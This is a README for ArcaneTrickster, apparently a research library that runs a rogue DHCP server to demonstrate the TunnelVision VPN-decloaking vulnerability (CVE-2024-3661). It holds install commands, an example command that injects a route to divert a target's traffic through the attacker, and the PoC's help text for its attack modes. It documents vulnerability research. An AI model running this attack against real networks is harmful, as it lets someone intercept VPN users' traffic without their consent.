# ArcaneTrickster
ArcaneTrickster, or "Arcane," is an event-driven research library for low-level networking. It was built as a research tool for TunnelVision (CVE-2024-3661) because we lacked a robust, rogue DHCP server.

Its goals are to:
* Take over as the de-facto DHCP server without relying on race conditions
* Minimize disruption to clients
* Provide flexibility for diverse environments

## Install
```bash
git clone https://github.com/superit23/arcanetrickster.git
python3 -m venv arcaneenv
source ./arcaneenv/bin/activate
python3 -m pip install -r ./arcanetrickster/requirements.txt
```

## Usage
Currently, Arcane requires some amount of programming skill to use. However, we built an easy TunnelVision PoC in the "tunnelvision.py" script that executes the adjacent host decloaking attack.

Here's an example. Imagine we're on the 10.10.10.0/24 subnet, 10.10.10.1 is the authoritative DHCP server, our current IP is 10.10.10.220, and we want to snoop on traffic to 8.8.8.8. We'd listen on the appropriate interface with `-i`, and inject a route sending traffic for 8.8.8.8 to 10.10.10.220 with `-r`, use the `adjacent` attack vector, and tell the DHCPReleaser to send releases to 10.10.10.1 with `-s`.
```bash
./scripts/tunnelvision.py -i enp0s3 -r 8.8.8.8/32:10.10.10.220 adjacent -s 10.10.10.1
```

Help text:
```bash
└─$ ./scripts/tunnelvision.py -h
usage: TunnelVision PoC [-h] -i INTERFACE [-d DNS] [-r ROUTE] [-l LEASE_TIME] [-v] {adjacent,authoritative} ...

Decloaks VPN users on the LAN

positional arguments:
  {adjacent,authoritative}

options:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Interface to listen on
  -d DNS, --dns DNS     DNS server
  -r ROUTE, --route ROUTE
                        Route to add to table. May be listed more than once
  -l LEASE_TIME, --lease-time LEASE_TIME
                        Lease duration
  -v, --verbose         Print DEBUG messages to console


└─$ ./scripts/tunnelvision.py adjacent -h
usage: TunnelVision PoC adjacent [-h] [-s SERVER]

options:
  -h, --help            show this help message and exit
  -s SERVER, --server SERVER
                        DHCP server to attack


└─$ ./scripts/tunnelvision.py authoritative -h
usage: TunnelVision PoC authoritative [-h] [-n NETWORK] [-m MASK]

options:
  -h, --help            show this help message and exit
  -n NETWORK, --network NETWORK
                        Network addresses to lease
  -m MASK, --mask MASK  Subnet mask
```
